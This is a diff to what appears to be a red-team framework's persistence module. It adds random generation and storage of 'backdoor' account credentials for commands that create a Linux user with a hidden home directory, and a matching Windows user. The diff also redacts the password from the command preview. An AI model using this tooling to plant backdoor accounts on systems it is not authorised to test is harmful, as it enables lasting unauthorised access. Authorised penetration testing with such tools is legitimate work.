@@ -7,9 +7,13 @@ from __future__ import annotations
 import cmd2
 
 import os
+import secrets
+import string
 import subprocess
 
+from cli.assign import apply_assign
 from cli.commands._base import LazyOwnCommandSet, require_rhost
+from core.config import save_payload
 from core.hardening import escape_powershell_single_quoted
 from utils import (
     GREEN,
@@ -28,6 +32,60 @@ from utils import (
 class PersistMigratedCommandSet(LazyOwnCommandSet):
     phase = "persist"
     category = "05. Persistence"
+
+    @staticmethod
+    def generate_backdoor_username() -> str:
+        """Generate a random backdoor username (same shape as C2 operators)."""
+        suffix = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
+        return f"operator_{suffix}"
+
+    @staticmethod
+    def generate_backdoor_password() -> str:
+        """Generate a random backdoor password safe for assign, chpasswd and CLIs.
+
+        Excludes every character rejected by ``apply_assign`` (shell
+        metacharacters) plus ``:`` (chpasswd delimiter) and quotes.
+        """
+        alphabet = string.ascii_letters + string.digits + "%+=._-"
+        return "".join(secrets.choice(alphabet) for _ in range(20))
+
+    @staticmethod
+    def resolve_backdoor_creds(params: dict) -> tuple[str, str]:
+        """Return configured creds, or fresh random ones when unset.
+
+        Pure function (no I/O): callers persist via ``assign`` when the
+        returned values differ from the placeholders.
+        """
+        username = str(params.get("backdoor_username", "CHANGE_ME") or "")
+        password = str(params.get("backdoor_password", "CHANGE_ME") or "")
+        if username not in ("", "CHANGE_ME") and password not in ("", "CHANGE_ME"):
+            return username, password
+        return (
+            PersistMigratedCommandSet.generate_backdoor_username(),
+            PersistMigratedCommandSet.generate_backdoor_password(),
+        )
+
+    def _ensure_backdoor_creds(self) -> tuple[str, str] | None:
+        """Return usable backdoor creds, generating + persisting when unset.
+
+        Mirrors the lazyc2 operator bootstrap: ``CHANGE_ME`` placeholders
+        become random credentials persisted through ``assign`` so later
+        runs, agents, and the loop reuse them instead of failing.
+        """
+        was_missing = str(self.params.get("backdoor_username", "CHANGE_ME") or "") in ("", "CHANGE_ME") or str(
+            self.params.get("backdoor_password", "CHANGE_ME") or ""
+        ) in ("", "CHANGE_ME")
+        username, password = self.resolve_backdoor_creds(self.params)
+        if not was_missing:
+            return username, password
+        ok_user = apply_assign(self.params, "backdoor_username", username, save=save_payload)
+        ok_pass = apply_assign(self.params, "backdoor_password", password, save=save_payload)
+        if not (ok_user and ok_pass):
+            print_error("Could not persist generated credentials (assign rejected).")
+            return None
+        print_msg(f"Generated random backdoor user: {username} (persisted via assign)")
+        print_warn("Password stored in payload.json, never printed. Rotate with: assign backdoor_password <new>")
+        return username, password
 
     @cmd2.with_category("05. Persistence")
     def do_pwncat(self, line):
@@ -228,13 +286,11 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         - Run it in a terminal to create the user and assign up the permissions as specified.
         Note: Ensure `xclip` is installed and available on your system.
         """
-        username = self.params.get("backdoor_username", "CHANGE_ME")
-        password = self.params.get("backdoor_password", "CHANGE_ME")
-        home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
-
-        if username == "CHANGE_ME" or password == "CHANGE_ME":
-            print_error("backdoor_username and backdoor_password must be set in payload.json")
+        creds = self._ensure_backdoor_creds()
+        if creds is None:
             return
+        username, password = creds
+        home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
 
         cmd = (
             f"useradd -m -d {home_dir} -s /bin/bash {username} && "
@@ -245,7 +301,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             f"su - {username}"
         )
         from core.hardening import safe_clipboard_copy
-        print_msg(f"Command ready: {cmd[:80]}...")
+        print_msg(f"Command ready for user {username} (password redacted from preview).")
         if safe_clipboard_copy(cmd):
             print_warn("Copied to clipboard")
         else:
@@ -273,12 +329,10 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         - Copy the command from the clipboard.
         - Run it in a PowerShell terminal to create the user and assign the permissions as specified.
         """
-        username = self.params.get("backdoor_username", "CHANGE_ME")
-        password = self.params.get("backdoor_password", "CHANGE_ME")
-
-        if username == "CHANGE_ME" or password == "CHANGE_ME":
-            print_error("backdoor_username and backdoor_password must be set in payload.json")
+        creds = self._ensure_backdoor_creds()
+        if creds is None:
             return
+        username, password = creds
         username = escape_powershell_single_quoted(username)
         password = escape_powershell_single_quoted(password)
 
